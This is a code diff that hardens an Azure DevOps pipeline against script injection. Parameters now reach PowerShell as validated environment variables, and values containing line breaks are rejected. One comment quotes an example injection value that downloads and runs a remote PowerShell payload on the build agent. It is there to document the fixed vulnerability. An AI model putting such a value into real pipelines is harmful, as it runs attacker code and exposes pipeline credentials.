@@ -66,9 +66,50 @@ steps:
   - powershell: |
       $ErrorActionPreference = 'Stop'
 
+      # Queue-time parameters reach this script as environment variables, never as a
+      # template expression inside the script body. A template expression is expanded
+      # at compile time, so a free-text parameter is pasted in as SOURCE CODE. A
+      # value of
+      #     x'; iwr http://host/payload.ps1 | iex; '
+      # closed the quoting and ran on the agent, in a job holding ADO_PAT and the
+      # connection credentials. Reading $env: keeps the value data.
+      #
+      # The single-line check is the second half. Even as data, a value carrying a
+      # newline would append arbitrary KEY=VALUE lines to the environment file below -
+      # enough to override ADO_PAT or inject a credential.
+      function Assert-ParameterValue {
+        param(
+          [Parameter(Mandatory)] [string] $Name,
+          [AllowEmptyString()] [string] $Value,
+          [switch] $Required,
+          [string] $Pattern
+        )
+
+        if ([string]::IsNullOrWhiteSpace($Value)) {
+          if ($Required) { throw "Parameter '$Name' is required and arrived empty." }
+          return ''
+        }
+        # Character codes rather than an escape sequence: this text passes through a
+        # YAML block scalar, and a backslash escape in that position is easy to mangle.
+        if ($Value.IndexOfAny([char[]]@([char]13, [char]10)) -ge 0) {
+          throw "Parameter '$Name' contains a line break, which would inject extra variables into the environment file."
+        }
+
+        $trimmed = $Value.Trim()
+        if ($Pattern -and $trimmed -notmatch $Pattern) {
+          throw "Parameter '$Name' has value '$trimmed', which does not match the expected form $Pattern."
+        }
+        return $trimmed
+      }
+
+      $organizationUrl = Assert-ParameterValue -Name 'organizationUrl' -Value $env:PARAM_ORGANIZATION_URL -Required `
+        -Pattern '^https://[A-Za-z0-9][A-Za-z0-9.-]*/[A-Za-z0-9._~%-]+$'
+      $project = Assert-ParameterValue -Name 'project' -Value $env:PARAM_PROJECT -Required `
+        -Pattern '^[A-Za-z0-9][A-Za-z0-9 ._-]*$'
+
       $lines = @(
-        "ADO_ORG_URL=${{ parameters.organizationUrl }}",
-        "ADO_PROJECT=${{ parameters.project }}",
+        "ADO_ORG_URL=$organizationUrl",
+        "ADO_PROJECT=$project",
         "ADO_PAT=$env:ADO_PAT"
       )
 
@@ -85,22 +126,45 @@ steps:
     displayName: Materialise the environment file
     env:
       ADO_PAT: $(ADO_PAT)
+      PARAM_ORGANIZATION_URL: ${{ parameters.organizationUrl }}
+      PARAM_PROJECT: ${{ parameters.project }}
       APP_ALPHA_PASSWORD: $(APP_ALPHA_PASSWORD)
       APP_BETA_PASSWORD: $(APP_BETA_PASSWORD)
 
   - powershell: |
       $ErrorActionPreference = 'Stop'
 
-      $arguments = @{
-        Command = '${{ parameters.command }}'
-        EnvFile = '.env.pipeline'
+      # Same rule as the previous step: parameters arrive as environment variables.
+      # 'command' is re-checked against the closed list even though the parameter
+      # declares one, because this script must not depend on that declaration
+      # surviving a future edit.
+      $command = "$env:PARAM_COMMAND".Trim()
+      if ($command -notin @('validate', 'inventory', 'plan', 'smoke', 'apply')) {
+        throw "Unsupported command '$command'."
       }
 
-      if ('${{ parameters.applicationKey }}') { $arguments.ApplicationKey = '${{ parameters.applicationKey }}' }
-      if ('${{ parameters.environment }}') { $arguments.Environment = '${{ parameters.environment }}' }
+      function Get-OptionalParameter {
+        param([Parameter(Mandatory)] [string] $Name, [AllowEmptyString()] [string] $Value, [Parameter(Mandatory)] [string] $Pattern)
+        if ([string]::IsNullOrWhiteSpace($Value)) { return '' }
+        $trimmed = $Value.Trim()
+        if ($trimmed -notmatch $Pattern) {
+          throw "Parameter '$Name' has value '$trimmed', which does not match the expected form $Pattern."
+        }
+        return $trimmed
+      }
 
-      if ('${{ parameters.command }}' -eq 'apply') {
-        if ('${{ parameters.confirmApply }}' -ne 'True') {
+      $applicationKey = Get-OptionalParameter -Name 'applicationKey' -Value $env:PARAM_APPLICATION_KEY -Pattern '^[A-Za-z0-9][A-Za-z0-9_-]*$'
+      $environmentName = Get-OptionalParameter -Name 'environment' -Value $env:PARAM_ENVIRONMENT -Pattern '^[A-Z0-9_]+$'
+
+      $arguments = @{
+        Command = $command
+        EnvFile = '.env.pipeline'
+      }
+      if ($applicationKey) { $arguments.ApplicationKey = $applicationKey }
+      if ($environmentName) { $arguments.Environment = $environmentName }
+
+      if ($command -eq 'apply') {
+        if ("$env:PARAM_CONFIRM_APPLY" -ne 'True') {
           throw "'apply' requires the Confirm apply parameter. Re-run with it ticked, after reviewing a plan."
         }
         $arguments.ConfirmApply = $true
@@ -108,6 +172,11 @@ steps:
 
       ./automations/variable-group-configuration/Invoke-VariableGroupConfiguration.ps1 @arguments
     displayName: Run variable-group-configuration
+    env:
+      PARAM_COMMAND: ${{ parameters.command }}
+      PARAM_APPLICATION_KEY: ${{ parameters.applicationKey }}
+      PARAM_ENVIRONMENT: ${{ parameters.environment }}
+      PARAM_CONFIRM_APPLY: ${{ parameters.confirmApply }}
 
   - publish: artifacts
     artifact: variable-group-configuration-$(Build.BuildId)
